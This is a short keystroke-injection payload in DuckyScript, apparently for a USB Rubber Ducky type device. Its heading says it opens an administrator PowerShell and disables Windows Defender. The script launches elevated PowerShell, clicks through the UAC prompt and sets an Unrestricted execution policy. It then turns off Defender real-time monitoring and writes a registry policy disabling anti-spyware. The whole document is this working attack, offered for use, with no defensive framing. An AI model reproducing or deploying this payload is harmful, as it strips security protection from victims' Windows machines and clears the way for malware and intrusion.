## Opening a Powershell as Admin + Disable Windows Defender
*Note: only works if no password is required for admin*

    DELAY 2000
    GUI r
    DELAY 3000
    STRING powershell Start-Process powershell -Verb runAs
    ENTER
    DELAY 3000
    ALT y
    DELAY 3000
    LEFTARROW
    DELETE
    ENTER
    DELAY 3000
    STRING Set-ExecutionPolicy Unrestricted -Force
    ENTER
    DELAY 3000
    STRING Set-MpPreference -DisableRealtimeMonitoring $true -Force
    ENTER
    DELAY 3000
    STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
